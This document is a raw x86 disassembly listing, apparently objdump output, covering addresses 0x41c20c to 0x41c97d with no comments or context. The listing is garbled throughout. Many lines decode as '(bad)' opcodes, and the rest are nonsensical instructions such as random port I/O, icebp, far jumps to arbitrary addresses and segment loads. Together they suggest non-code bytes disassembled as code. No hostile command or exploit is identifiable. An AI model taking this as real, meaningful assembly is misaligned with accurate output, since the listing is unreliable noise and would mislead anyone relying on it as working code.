  41c20c:	test   BYTE PTR [ebx],0x7a
  41c20f:	mov    dl,bh
  41c211:	cmp    DWORD PTR [edx],esp
  41c213:	push   ecx
  41c214:	add    DWORD PTR [eax],edx
  41c216:	cmp    BYTE PTR [ecx+eax*2+0x6b],0xf8
  41c21b:	jl     0x41c1e0
  41c21d:	sub    cl,BYTE PTR [ecx]
  41c21f:	je     0x41c219
  41c221:	rcl    BYTE PTR [eax+0x7f],0xfc
  41c225:	and    esp,DWORD PTR [eax-0x7]
  41c228:	dec    BYTE PTR [esi+0x6a7d50b3]
  41c22e:	xchg   esi,ebx
  41c230:	(bad)  
  41c231:	imul   esp,DWORD PTR [esi*4+0x44fc7543],0xffffffd2
  41c239:	icebp  
  41c23a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c23b:	pop    edi
  41c23c:	addr16 mov edi,0x5b0bd725
  41c242:	jo     0x41c1d6
  41c244:	sbb    dl,dh
  41c246:	lods   al,BYTE PTR ds:[esi]
  41c247:	inc    ecx
  41c248:	adc    edx,DWORD PTR [edi-0x2f]
  41c24b:	sbb    DWORD PTR [esp+ebx*4-0x621b310],0xc74bf9e0
  41c256:	retf   0x2aaf
  41c259:	in     al,dx
  41c25a:	sbb    BYTE PTR [ecx-0x5fd114d],al
  41c260:	loopne 0x41c2d8
  41c262:	push   ebp
  41c263:	push   0x644b733c
  41c268:	fcom   DWORD PTR [edi]
  41c26a:	scas   eax,DWORD PTR es:[edi]
  41c26b:	jp     0x41c29b
  41c26d:	sub    al,0xde
  41c26f:	lock sbb DWORD PTR [ebx],ebp
  41c272:	loope  0x41c2c5
  41c274:	mov    bh,0xb3
  41c276:	sar    BYTE PTR [ecx-0x7eac127a],0x86
  41c27d:	mov    ch,bh
  41c27f:	dec    eax
  41c280:	out    dx,al
  41c281:	fcomp  QWORD PTR [edx+0x1a]
  41c284:	cmp    BYTE PTR [ecx],bh
  41c286:	push   eax
  41c287:	inc    esi
  41c288:	sub    eax,0x20b5d344
  41c28d:	push   esp
  41c28e:	lds    ebx,FWORD PTR [ecx]
  41c290:	and    DWORD PTR [ecx],ebx
  41c292:	jecxz  0x41c304
  41c294:	ins    DWORD PTR es:[edi],dx
  41c295:	imul   edx,DWORD PTR [ebx],0x2
  41c298:	dec    esp
  41c299:	mov    al,0x70
  41c29b:	loope  0x41c30b
  41c29d:	scas   al,BYTE PTR es:[edi]
  41c29e:	add    eax,0x41b20f3d
  41c2a3:	mov    edx,0xf7047215
  41c2a8:	and    eax,0x65aeaa8
  41c2ad:	fild   DWORD PTR [ebx+edi*4-0x7]
  41c2b1:	mov    WORD PTR [eax],?
  41c2b3:	std    
  41c2b4:	mov    esp,0xb59b67fb
  41c2b9:	or     BYTE PTR [ebx+0x3875713d],bh
  41c2bf:	mov    dl,0x0
  41c2c1:	ins    BYTE PTR es:[edi],dx
  41c2c2:	and    al,0xc3
  41c2c4:	repz fld DWORD PTR [edx]
  41c2c7:	jmp    FWORD PTR [ebx-0x5c]
  41c2ca:	(bad)  
  41c2cb:	dec    edx
  41c2cc:	test   DWORD PTR [ebp-0x2c],esp
  41c2cf:	neg    BYTE PTR [ecx]
  41c2d1:	(bad)  
  41c2d2:	dec    eax
  41c2d3:	lea    edx,gs:[ecx]
  41c2d6:	out    dx,al
  41c2d7:	test   eax,0x71f3da7c
  41c2dc:	shl    edi,0x2d
  41c2df:	or     ch,0xe7
  41c2e2:	fnstenv [ebx+ecx*4]
  41c2e5:	outs   dx,BYTE PTR ds:[esi]
  41c2e6:	mov    al,0x1a
  41c2e8:	stos   BYTE PTR es:[edi],al
  41c2e9:	in     al,dx
  41c2ea:	fwait
  41c2eb:	pop    edx
  41c2ec:	mov    dl,0x45
  41c2ee:	pop    ebx
  41c2ef:	hlt    
  41c2f0:	pop    ebx
  41c2f1:	cwde   
  41c2f2:	out    0x49,al
  41c2f4:	or     eax,0xe8d44f24
  41c2f9:	cli    
  41c2fa:	adc    al,0xcb
  41c2fc:	dec    esi
  41c2fd:	(bad)  
  41c2fe:	in     al,0x19
  41c300:	les    ebx,FWORD PTR [edx]
  41c302:	dec    ebx
  41c303:	in     eax,0xc7
  41c305:	mov    cl,0xb1
  41c307:	inc    eax
  41c308:	(bad)
  41c30d:	addr16 mov ch,0xbc
  41c310:	push   edi
  41c311:	ret    
  41c312:	push   bp
  41c314:	jno    0x41c33e
  41c316:	jno    0x41c31d
  41c318:	data16 sti 
  41c31a:	add    DWORD PTR [ecx],edx
  41c31c:	aaa    
  41c31d:	push   ebp
  41c31e:	or     edx,DWORD PTR [esi-0x74169707]
  41c324:	mov    ebx,0xbc66d112
  41c329:	lds    ebx,FWORD PTR [edx]
  41c32b:	sbb    dl,al
  41c32d:	add    eax,0x58fc4316
  41c332:	pop    ss
  41c333:	sbb    ah,BYTE PTR [edx-0x4b4e3a5f]
  41c339:	mov    edx,0xc1ee58e5
  41c33e:	ja     0x41c2db
  41c340:	push   0xe691ebf4
  41c345:	mov    ecx,0x6251d474
  41c34a:	dec    BYTE PTR [edx+edi*8+0x41e489a9]
  41c351:	add    al,0xe4
  41c353:	cwde   
  41c354:	mov    ebx,edi
  41c356:	in     al,dx
  41c357:	adc    ebx,edi
  41c359:	mov    ebx,0x5fa0e9fb
  41c35e:	mov    eax,0xcc1c2559
  41c363:	rcr    DWORD PTR [eax],0x98
  41c366:	clc    
  41c367:	sbb    eax,0x73dc5e9c
  41c36c:	js     0x41c337
  41c36e:	cmp    ch,BYTE PTR [esi-0x5c]
  41c371:	mov    DWORD PTR [eax],ebp
  41c373:	sub    ebp,esp
  41c375:	add    ebp,edx
  41c377:	sub    dl,bh
  41c379:	jle    0x41c380
  41c37b:	xchg   BYTE PTR [ebp-0x6f],dl
  41c37e:	(bad)  
  41c37f:	in     al,0x88
  41c381:	mov    DWORD PTR [esp+esi*8+0x57],0x7e2bec32
  41c389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c38a:	popa   
  41c38b:	sub    BYTE PTR ds:0x3ae90aa2,al
  41c391:	dec    esp
  41c392:	mov    eax,0x2932d75
  41c397:	icebp  
  41c398:	(bad)  
  41c399:	cdq    
  41c39a:	loopne 0x41c33b
  41c39c:	mov    ah,0xfa
  41c39e:	pop    ebx
  41c39f:	popf   
  41c3a0:	mov    ds:0x72b6d52f,al
  41c3a5:	xchg   edx,eax
  41c3a6:	add    al,0x59
  41c3a8:	popa   
  41c3a9:	add    ecx,edx
  41c3ab:	not    DWORD PTR [ecx-0x46]
  41c3ae:	and    ebp,ebp
  41c3b0:	mov    BYTE PTR [ebx+edx*4+0x758816be],0x33
  41c3b8:	call   0xa34dbd91
  41c3bd:	int    0xe3
  41c3bf:	pextrw edx,mm3,0x3a
  41c3c3:	lods   al,BYTE PTR ds:[esi]
  41c3c4:	jle    0x41c3f8
  41c3c6:	mov    esi,0xa508b1a4
  41c3cb:	loop   0x41c41a
  41c3cd:	(bad)  
  41c3ce:	in     eax,0x6e
  41c3d0:	or     edx,esp
  41c3d2:	inc    esp
  41c3d3:	xchg   ebx,eax
  41c3d4:	loopne 0x41c3b1
  41c3d6:	mov    bh,0x46
  41c3d8:	repz dec ebp
  41c3da:	sub    DWORD PTR [ebp-0x71],ebp
  41c3dd:	stos   DWORD PTR es:[edi],eax
  41c3de:	and    dl,0xdc
  41c3e1:	xlat   BYTE PTR ds:[ebx]
  41c3e2:	in     eax,0x81
  41c3e4:	and    eax,ebp
  41c3e6:	dec    edi
  41c3e7:	inc    eax
  41c3e8:	inc    edi
  41c3e9:	push   ss
  41c3ea:	push   ebx
  41c3eb:	add    eax,0x2dfa3917
  41c3f0:	jp     0x41c398
  41c3f2:	xchg   edi,eax
  41c3f3:	js     0x41c3cc
  41c3f5:	ins    BYTE PTR es:[edi],dx
  41c3f6:	lahf   
  41c3f7:	nop
  41c3f8:	push   ebx
  41c3f9:	aaa    
  41c3fa:	mov    esi,0x6f3d917e
  41c3ff:	lock popf 
  41c401:	aam    0x74
  41c403:	ret    0xe82a
  41c406:	fwait
  41c407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c408:	mov    bh,0xd4
  41c40a:	jnp    0x41c455
  41c40c:	add    eax,0x48bc9ad3
  41c411:	cli    
  41c412:	sbb    BYTE PTR [eax+0x39],al
  41c415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c416:	in     al,0xcd
  41c418:	or     eax,0x74c3bb50
  41c41d:	push   0x0
  41c41f:	push   0x33
  41c421:	mov    edx,eax
  41c423:	dec    ebp
  41c424:	and    ebp,eax
  41c426:	(bad)  
  41c427:	jge    0x41c3ee
  41c429:	push   edx
  41c42a:	mov    bl,0x70
  41c42c:	and    DWORD PTR [ecx-0x57],0xaa1f2f28
  41c433:	add    BYTE PTR [eax],dl
  41c435:	pop    ebp
  41c436:	sbb    BYTE PTR [ebp+0x7f144b89],dh
  41c43c:	sti    
  41c43d:	adc    dh,BYTE PTR [edx]
  41c43f:	or     al,0x1d
  41c441:	mov    bl,0x4
  41c443:	(bad)  
  41c444:	mov    ?,WORD PTR [ecx]
  41c446:	jl     0x41c489
  41c448:	inc    esi
  41c449:	loop   0x41c472
  41c44b:	cmp    ah,al
  41c44d:	pop    esi
  41c44e:	mov    ds:0x463ec732,al
  41c453:	adc    BYTE PTR [ebx+0x55],cl
  41c456:	imul   esp,DWORD PTR [eax-0x76f9c5ba],0x79
  41c45d:	pop    ss
  41c45e:	push   edi
  41c45f:	sub    esp,DWORD PTR [eax-0x2ea4096f]
  41c465:	mov    ah,0x73
  41c467:	fsubr  DWORD PTR [ebx+0x43]
  41c46a:	(bad)  
  41c46b:	dec    edi
  41c46c:	cs jnp 0x41c442
  41c46f:	pop    es
  41c470:	mov    ds,WORD PTR [esi]
  41c472:	jge    0x41c445
  41c474:	fdivr  QWORD PTR [edi+0x4937055a]
  41c47a:	test   edi,ebp
  41c47c:	lea    edi,[ebp-0x3f8effc2]
  41c482:	(bad)  
  41c483:	out    dx,al
  41c484:	jecxz  0x41c495
  41c486:	int    0x29
  41c488:	dec    BYTE PTR [edx+0x35]
  41c48b:	jnp    0x41c4e6
  41c48d:	clc    
  41c48e:	jb     0x41c4be
  41c490:	inc    esi
  41c491:	mov    BYTE PTR [ebp+0x584f5464],bl
  41c497:	retf   0xc0a5
  41c49a:	xchg   ebx,eax
  41c49b:	push   eax
  41c49c:	xor    BYTE PTR [edx+0x57],0xe0
  41c4a0:	add    eax,0xf1fef2c7
  41c4a5:	test   BYTE PTR [eax-0x6d9ea1f],al
  41c4ab:	loop   0x41c456
  41c4ad:	sbb    DWORD PTR [edi],ecx
  41c4af:	imul   esp,DWORD PTR [esi+0x23665f9e],0x1c
  41c4b6:	ss push esi
  41c4b8:	rol    eax,cl
  41c4ba:	rol    BYTE PTR gs:[eax+0x126055f1],0x67
  41c4c2:	sub    DWORD PTR [edi-0x69522dc4],0x11a5f345
  41c4cc:	fdiv   QWORD PTR [edi-0x3c72096d]
  41c4d2:	jbe    0x41c50d
  41c4d4:	mov    WORD PTR [esp+eax*8],es
  41c4d7:	ja     0x41c4dd
  41c4d9:	loope  0x41c4f4
  41c4db:	jg     0x41c4e8
  41c4dd:	test   DWORD PTR ds:[ebx],ecx
  41c4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4e1:	(bad)  
  41c4e2:	sub    ch,BYTE PTR [edi]
  41c4e4:	cwde   
  41c4e5:	cwde   
  41c4e6:	fisubr DWORD PTR [edx-0x68]
  41c4e9:	xchg   edx,eax
  41c4ea:	inc    eax
  41c4eb:	push   es
  41c4ec:	mov    ch,0x5a
  41c4ee:	je     0x41c522
  41c4f0:	lds    ecx,FWORD PTR [edi-0x40]
  41c4f3:	cmp    al,0xed
  41c4f5:	repz push ds
  41c4f7:	push   ss
  41c4f8:	lods   al,BYTE PTR ds:[esi]
  41c4f9:	jge    0x41c556
  41c4fb:	xchg   ebp,eax
  41c4fc:	and    al,0xc6
  41c4fe:	and    BYTE PTR [edx-0x46],0x67
  41c502:	daa    
  41c503:	out    dx,al
  41c504:	icebp  
  41c505:	sbb    eax,0x98d8a891
  41c50a:	fild   DWORD PTR [ecx+0x31]
  41c50d:	jnp    0x41c4c4
  41c50f:	xor    eax,0x48e83f6f
  41c514:	shr    BYTE PTR [ebx+edi*2-0x5a],1
  41c518:	fnstsw WORD PTR [edi-0x270dbe60]
  41c51e:	push   0xfffffff7
  41c520:	enter  0x1c68,0xe0
  41c524:	mov    ecx,0xce0d7d74
  41c529:	lds    edx,FWORD PTR [ebx+ebp*4+0x54d6da4d]
  41c530:	rep ins BYTE PTR es:[edi],dx
  41c532:	or     dl,BYTE PTR [eax]
  41c534:	loop   0x41c53a
  41c536:	add    eax,0xc0aba538
  41c53b:	not    ch
  41c53d:	ror    ebp,0x59
  41c540:	test   BYTE PTR [edi+0x239878d1],al
  41c546:	push   es
  41c547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c548:	cwde   
  41c549:	and    ebx,ecx
  41c54b:	pop    ds
  41c54c:	call   0x71a8:0x1860429a
  41c553:	cmp    ebx,DWORD PTR [edx+0x285b11fa]
  41c559:	int    0xa1
  41c55b:	pop    ds
  41c55c:	adc    eax,0x4db81017
  41c561:	mov    edx,0xf682a86f
  41c566:	jmp    0x41c571
  41c568:	ins    BYTE PTR es:[edi],dx
  41c569:	xor    eax,0x6941f97a
  41c56e:	sbb    cl,dh
  41c570:	push   eax
  41c571:	es pop ecx
  41c573:	mov    ebp,ecx
  41c575:	sub    dh,BYTE PTR [edi+0x384a5916]
  41c57b:	add    eax,0x691aac91
  41c580:	shr    BYTE PTR [edx-0x5f],0xcd
  41c584:	xlat   BYTE PTR ds:[ebx]
  41c585:	push   es
  41c586:	pop    esp
  41c587:	(bad)  
  41c588:	mov    al,ds:0x8d338eee
  41c58d:	aas    
  41c58e:	push   bx
  41c590:	inc    ebx
  41c591:	jnp    0x41c5ce
  41c593:	pop    es
  41c594:	and    DWORD PTR [ebx+0x39],ecx
  41c597:	jnp    0x41c561
  41c599:	push   ss
  41c59a:	pop    ebp
  41c59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c59c:	inc    ebx
  41c59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c59e:	dec    DWORD PTR [ecx+edi*2-0x1c272973]
  41c5a5:	ret    0x13bc
  41c5a8:	add    al,0x35
  41c5aa:	mov    cl,0x16
  41c5ac:	adc    eax,DWORD PTR [esi+eiz*4]
  41c5af:	push   esi
  41c5b0:	mov    al,0x73
  41c5b2:	or     edx,edi
  41c5b4:	stos   BYTE PTR es:[edi],al
  41c5b5:	scas   eax,DWORD PTR es:[edi]
  41c5b6:	enter  0x53f5,0x88
  41c5ba:	add    ebx,ebx
  41c5bc:	mov    dh,0x8d
  41c5be:	outs   dx,DWORD PTR ds:[esi]
  41c5bf:	or     DWORD PTR [eax],ecx
  41c5c1:	test   eax,0xd22ffcf4
  41c5c6:	and    eax,0xd6b0d59f
  41c5cb:	pop    ecx
  41c5cc:	retf   
  41c5cd:	and    dl,dl
  41c5cf:	retf   0x9540
  41c5d2:	fild   WORD PTR [eax-0x63]
  41c5d5:	mov    edx,0xa6acb1a
  41c5da:	pop    es
  41c5db:	sbb    edi,ebp
  41c5dd:	inc    bp
  41c5df:	sub    BYTE PTR [ecx],bl
  41c5e1:	daa    
  41c5e2:	push   edi
  41c5e3:	mov    DWORD PTR [ecx],ebp
  41c5e5:	mov    edx,0xdd13f056
  41c5ea:	scas   al,BYTE PTR es:[edi]
  41c5eb:	xor    BYTE PTR [edx-0x54],0x7a
  41c5ef:	or     eax,0x731632ed
  41c5f4:	std    
  41c5f5:	jmp    0x41c606
  41c5f7:	xchg   esi,eax
  41c5f8:	pop    edi
  41c5f9:	mov    cl,0x79
  41c5fb:	outs   dx,BYTE PTR ds:[esi]
  41c5fc:	add    esi,DWORD PTR [ebp+0x72a3085]
  41c602:	mov    eax,ds:0x9d5c4899
  41c607:	adc    dl,bl
  41c609:	xor    eax,0x6ab70dcb
  41c60e:	inc    ebx
  41c60f:	add    ch,0x56
  41c612:	es add eax,0xc30b5147
  41c618:	jbe    0x41c643
  41c61a:	inc    ebx
  41c61b:	(bad)  
  41c61c:	in     al,0xba
  41c61e:	push   0x1361a280
  41c623:	jge    0x41c5d2
  41c625:	jmp    0x67610e00
  41c62a:	ret    
  41c62b:	jmp    0x596fbf43
  41c630:	jmp    0x172f:0xd787155a
  41c637:	add    edi,DWORD PTR [edx+0xac7560]
  41c63d:	push   edx
  41c63e:	dec    ebx
  41c63f:	imul   eax,esi,0x7b
  41c642:	daa    
  41c643:	cmp    dl,BYTE PTR [ebx]
  41c645:	retf   
  41c646:	mov    dh,0x23
  41c648:	bound  ecx,QWORD PTR [edx]
  41c64a:	xchg   DWORD PTR [ecx+0x57168f2c],ecx
  41c650:	(bad)  
  41c651:	lahf   
  41c652:	ret    0x5d1e
  41c655:	out    0x71,al
  41c657:	jno    0x41c621
  41c659:	add    DWORD PTR [edi+0xc2fc6b3],0x6b64b840
  41c663:	mov    ds:0xe59b5733,eax
  41c668:	adc    al,0xeb
  41c66a:	adc    DWORD PTR [esi],ebx
  41c66c:	mov    dh,0x7c
  41c66e:	test   al,0xab
  41c670:	rcr    DWORD PTR [ebp+0x6e],1
  41c673:	test   BYTE PTR gs:[ecx+edx*2-0x3417b8a6],al
  41c67b:	adc    DWORD PTR [esi+edx*1-0x4b39b575],0x7b
  41c683:	aam    0x42
  41c685:	add    DWORD PTR [ebx-0x65aa30fe],edi
  41c68b:	pop    ds
  41c68c:	fcomp  QWORD PTR ds:0xde312d2e
  41c692:	mov    edx,0x6cde4f5a
  41c697:	das    
  41c698:	mov    ds:0xd861343c,eax
  41c69d:	pop    ss
  41c69e:	mov    WORD PTR [edx-0x20],ds
  41c6a1:	mov    esp,0xdc0841d6
  41c6a6:	and    eax,0x46603391
  41c6ab:	jb     0x41c685
  41c6ad:	inc    eax
  41c6ae:	push   eax
  41c6af:	cmp    ebp,DWORD PTR [esi+eax*4-0x5433ae81]
  41c6b6:	add    ebp,esp
  41c6b8:	adc    BYTE PTR ds:0x983b7a87,0x3b
  41c6bf:	lods   eax,DWORD PTR ds:[esi]
  41c6c0:	test   al,0x7c
  41c6c2:	imul   eax,DWORD PTR [edx],0x29695021
  41c6c8:	mov    ch,0xf1
  41c6ca:	out    0x85,eax
  41c6cc:	mov    ebx,0x88cd33de
  41c6d1:	push   ebp
  41c6d2:	sbb    ch,BYTE PTR [eax+ebp*8]
  41c6d5:	inc    esi
  41c6d6:	pop    esi
  41c6d7:	push   ss
  41c6d8:	mov    eax,es
  41c6da:	(bad)  
  41c6db:	pusha  
  41c6dc:	lea    edi,[ecx+0x56128e7a]
  41c6e2:	enter  0x2148,0x24
  41c6e6:	xchg   BYTE PTR [edi+0xb9ea37a],dl
  41c6ec:	and    al,0xee
  41c6ee:	(bad)  
  41c6ef:	fnstenv [ecx]
  41c6f1:	test   BYTE PTR [ebp-0x39],cl
  41c6f4:	out    dx,eax
  41c6f5:	test   BYTE PTR fs:[ebx],cl
  41c6f8:	xor    DWORD PTR ds:0x2e2a7451,0x47
  41c6ff:	shr    BYTE PTR [ebx-0x705863b],cl
  41c705:	pop    eax
  41c706:	xor    eax,0x3d812e95
  41c70b:	push   eax
  41c70c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c70d:	addr16 mov ah,0x1e
  41c710:	cmp    cl,BYTE PTR [edx]
  41c712:	retf   
  41c713:	push   cs
  41c714:	sub    eax,0xfdd050cb
  41c719:	je     0x41c705
  41c71b:	das    
  41c71c:	jbe    0x41c702
  41c71e:	in     eax,0xaa
  41c720:	inc    ecx
  41c721:	push   cs
  41c722:	fs dec esp
  41c724:	popa   
  41c725:	sbb    esp,DWORD PTR [ebx-0x37]
  41c728:	xor    al,0x8f
  41c72a:	jl     0x41c705
  41c72c:	push   ecx
  41c72d:	stos   BYTE PTR es:[edi],al
  41c72e:	out    0x9d,eax
  41c730:	sub    eax,0x12b88d3b
  41c735:	jbe    0x41c75c
  41c737:	inc    eax
  41c738:	sub    eax,0xe62a7c39
  41c73d:	jl     0x41c74a
  41c73f:	cmp    eax,DWORD PTR [esi+0x55]
  41c742:	mov    esi,0xb27a7a9b
  41c747:	js     0x41c787
  41c749:	mov    ebx,0x712e0229
  41c74e:	pop    ss
  41c74f:	mov    eax,0x873e75ef
  41c754:	mov    esp,0xec66cb81
  41c759:	nop
  41c75a:	jae    0x41c6ed
  41c75c:	xchg   esi,eax
  41c75d:	pop    ss
  41c75e:	popf   
  41c75f:	(bad)  
  41c760:	fst    DWORD PTR [ecx-0x2e]
  41c763:	mov    esi,0x1915ce93
  41c768:	enter  0x9b6c,0xb5
  41c76c:	nop
  41c76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c76e:	shl    BYTE PTR [edi],1
  41c770:	jo     0x41c7ca
  41c772:	jle    0x41c752
  41c774:	pop    ss
  41c775:	pusha  
  41c776:	mov    cl,0xaa
  41c778:	dec    edx
  41c779:	out    dx,al
  41c77a:	fld    TBYTE PTR [edi-0x32]
  41c77d:	jge    0x41c792
  41c77f:	adc    BYTE PTR [ecx+0x5e310b83],0x74
  41c786:	push   cs
  41c787:	sub    dl,BYTE PTR [edi-0x4b553546]
  41c78d:	xchg   ebp,eax
  41c78e:	dec    eax
  41c78f:	adc    BYTE PTR [ebx],bh
  41c791:	xchg   edi,eax
  41c792:	out    0xf1,eax
  41c794:	imul   ch
  41c796:	mov    bl,0xd
  41c798:	adc    ebp,eax
  41c79a:	out    dx,eax
  41c79b:	outs   dx,BYTE PTR ds:[esi]
  41c79c:	lahf   
  41c79d:	add    al,0x9c
  41c79f:	inc    edx
  41c7a0:	mov    ecx,0xd7484bdc
  41c7a5:	stc    
  41c7a6:	stos   BYTE PTR es:[edi],al
  41c7a7:	cli    
  41c7a8:	sbb    eax,0xf12a145d
  41c7ad:	in     eax,dx
  41c7ae:	pop    ss
  41c7af:	ins    DWORD PTR es:[edi],dx
  41c7b0:	pop    ss
  41c7b1:	mov    cs,WORD PTR [esi-0x1ebb28aa]
  41c7b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7b8:	outs   dx,DWORD PTR ds:[esi]
  41c7b9:	in     al,dx
  41c7ba:	les    ecx,FWORD PTR [edi]
  41c7bc:	dec    esp
  41c7bd:	sti    
  41c7be:	jmp    FWORD PTR [edx+0x3eb856f]
  41c7c4:	jns    0x41c7ea
  41c7c6:	adc    al,0x1
  41c7c8:	inc    esp
  41c7c9:	(bad)  
  41c7ca:	ds sbb eax,0x7cc36a81
  41c7d0:	es inc esp
  41c7d2:	push   ecx
  41c7d3:	enter  0x3205,0x49
  41c7d7:	mov    edi,0x49ca7c1
  41c7dc:	icebp  
  41c7dd:	push   es
  41c7de:	push   ds
  41c7df:	mov    ecx,0xcc4eca8c
  41c7e4:	lods   al,BYTE PTR ds:[esi]
  41c7e5:	(bad)  
  41c7e6:	jp     0x41c863
  41c7e8:	ret    
  41c7e9:	add    eax,0x8bf84306
  41c7ee:	cmp    bh,BYTE PTR [edx+0x760b332c]
  41c7f4:	xchg   BYTE PTR [esi+0x40],dl
  41c7f7:	in     al,dx
  41c7f8:	sbb    DWORD PTR [ebx+0x7981cead],ebx
  41c7fe:	sub    ecx,DWORD PTR [ebp-0x7c]
  41c801:	scas   eax,DWORD PTR es:[edi]
  41c802:	(bad)  
  41c803:	shl    DWORD PTR [ebx+0x31],0x71
  41c807:	nop
  41c808:	xlat   BYTE PTR ds:[ebx]
  41c809:	cmp    al,bl
  41c80b:	les    ecx,FWORD PTR [esi]
  41c80d:	inc    edx
  41c80e:	jecxz  0x41c84b
  41c810:	dec    esi
  41c811:	div    DWORD PTR [esi+0x1875a26e]
  41c817:	(bad)  
  41c818:	and    DWORD PTR [ebp-0x5],0xffffffa7
  41c81c:	sti    
  41c81d:	xor    al,0xa3
  41c81f:	(bad)  [eax]
  41c821:	neg    edi
  41c823:	push   esi
  41c824:	add    dl,al
  41c826:	stc    
  41c827:	mov    ds:0x1e72b6d2,al
  41c82c:	enter  0x4494,0xa1
  41c830:	inc    esp
  41c831:	out    dx,eax
  41c832:	call   0xa59e43df
  41c837:	sbb    ebp,eax
  41c839:	pop    esi
  41c83a:	or     DWORD PTR ds:0xaf3b9cbb,ebp
  41c840:	pop    ecx
  41c841:	das    
  41c842:	int    0xed
  41c844:	es xchg esp,eax
  41c846:	or     al,0x2f
  41c848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c849:	add    DWORD PTR [esi],esi
  41c84b:	or     DWORD PTR [edx+edx*4+0x39],eax
  41c84f:	pop    edi
  41c850:	lahf   
  41c851:	sbb    ebx,ebx
  41c853:	adc    DWORD PTR [ecx+edi*1],ecx
  41c856:	in     eax,0xfe
  41c858:	rol    edi,cl
  41c85a:	inc    esp
  41c85b:	xchg   esp,eax
  41c85c:	lds    ebx,FWORD PTR [ecx+0x1119ce85]
  41c862:	std    
  41c863:	mov    esp,0x52e24cd3
  41c868:	ret    
  41c869:	mov    bl,0xda
  41c86b:	aaa    
  41c86c:	jmp    0x41c853
  41c86e:	das    
  41c86f:	ds ins BYTE PTR es:[edi],dx
  41c871:	and    BYTE PTR [ecx-0x55d33702],0xe8
  41c878:	mov    BYTE PTR [eax+0x48396d84],dl
  41c87e:	mov    al,0x38
  41c880:	mov    eax,0xf1a9b74b
  41c885:	add    ah,bh
  41c887:	cmp    eax,0xee2eed43
  41c88c:	sub    ah,ch
  41c88e:	and    al,0xeb
  41c890:	int3   
  41c891:	(bad)  
  41c892:	xlat   BYTE PTR ds:[ebx]
  41c893:	xchg   edi,eax
  41c894:	or     dl,BYTE PTR [ebx+eiz*8]
  41c897:	mov    dl,0xf
  41c899:	ror    BYTE PTR [edi+0x6620ab2e],1
  41c89f:	stc    
  41c8a0:	and    eax,0xa4cdb6ed
  41c8a5:	les    ebp,FWORD PTR [ebp+0x78]
  41c8a8:	in     al,dx
  41c8a9:	imul   esp,DWORD PTR [ebp-0x43],0xffffffba
  41c8ad:	lods   al,BYTE PTR gs:[esi]
  41c8af:	ror    DWORD PTR [edi],0xf1
  41c8b2:	imul   ebp,DWORD PTR [eax+0x4a],0x6
  41c8b6:	cdq    
  41c8b7:	and    BYTE PTR [esi+edx*4-0x6db29a86],bh
  41c8be:	add    BYTE PTR [ecx],ah
  41c8c0:	sub    al,0x53
  41c8c2:	mov    al,0xbd
  41c8c4:	mov    ds:0x97e2f08c,eax
  41c8c9:	dec    ebp
  41c8ca:	push   0xfb1dc165
  41c8cf:	mov    ebp,0xfda37634
  41c8d4:	push   ecx
  41c8d5:	xor    al,0xef
  41c8d7:	sub    DWORD PTR [edi-0x3d60d7fa],esi
  41c8dd:	dec    edi
  41c8de:	in     eax,dx
  41c8df:	icebp  
  41c8e0:	xor    esi,DWORD PTR [ebx+ebx*8+0x4f]
  41c8e4:	test   al,0xd0
  41c8e6:	inc    edx
  41c8e7:	ret    
  41c8e8:	xchg   esp,eax
  41c8e9:	(bad)  
  41c8ea:	scas   al,BYTE PTR es:[edi]
  41c8eb:	jmp    0x70b3:0xb4d8414d
  41c8f2:	sti    
  41c8f3:	sbb    eax,0xeb56173f
  41c8f8:	pop    esi
  41c8f9:	mul    BYTE PTR [edi+ebx*8]
  41c8fc:	add    ebx,DWORD PTR [esi-0x3d]
  41c8ff:	fmul   st,st(1)
  41c901:	cmp    BYTE PTR [edi-0x23770148],cl
  41c907:	push   ds
  41c908:	xchg   esp,eax
  41c909:	pop    ecx
  41c90a:	sbb    al,0xd4
  41c90c:	sbb    DWORD PTR [eax+0x26],ebx
  41c90f:	cmp    dl,BYTE PTR ss:[ecx]
  41c912:	xor    DWORD PTR [edi+0xf],ebx
  41c915:	lods   eax,DWORD PTR ds:[esi]
  41c916:	pop    ss
  41c917:	push   edi
  41c918:	inc    ebp
  41c919:	pushf  
  41c91a:	(bad)  
  41c91b:	jmp    0x41c908
  41c91d:	dec    edi
  41c91e:	lods   al,BYTE PTR ds:[esi]
  41c91f:	xlat   BYTE PTR ds:[ebx]
  41c920:	pop    ss
  41c921:	jns    0x41c933
  41c923:	out    dx,eax
  41c924:	ret    0x9561
  41c927:	in     eax,0x83
  41c929:	imul   eax,eax,0x6edf114c
  41c92f:	cmp    ch,BYTE PTR [edi-0x4c]
  41c932:	push   cs
  41c933:	jo     0x41c99f
  41c935:	leave  
  41c936:	cli    
  41c937:	jmp    0xdba2d049
  41c93c:	mov    ah,0xe9
  41c93e:	std    
  41c93f:	jp     0x41c95c
  41c941:	xchg   esp,eax
  41c942:	dec    eax
  41c943:	adc    cl,dl
  41c945:	fistp  DWORD PTR [edx-0x47]
  41c948:	push   edi
  41c949:	cmp    BYTE PTR [esi+0xe363de],bh
  41c94f:	mov    ds:0x5d8585a7,eax
  41c954:	or     DWORD PTR [ebx-0x41],edi
  41c957:	(bad)  
  41c958:	std    
  41c959:	push   cs
  41c95a:	in     eax,0x6
  41c95c:	push   ecx
  41c95d:	loop   0x41c942
  41c95f:	fstp   QWORD PTR [ebx+0x76]
  41c962:	nop
  41c963:	sub    eax,DWORD PTR [edx-0x68]
  41c966:	cwde   
  41c967:	pop    esi
  41c968:	inc    esp
  41c969:	sbb    edi,DWORD PTR [ecx+0x18]
  41c96c:	int3   
  41c96d:	jmp    0x5d93113d
  41c972:	sub    edx,DWORD PTR [eax+edi*4+0x39]
  41c976:	div    DWORD PTR [edx-0x48]
  41c979:	es push eax
  41c97b:	fwait
  41c97c:	xchg   ebx,eax
  41c97d:	sti    
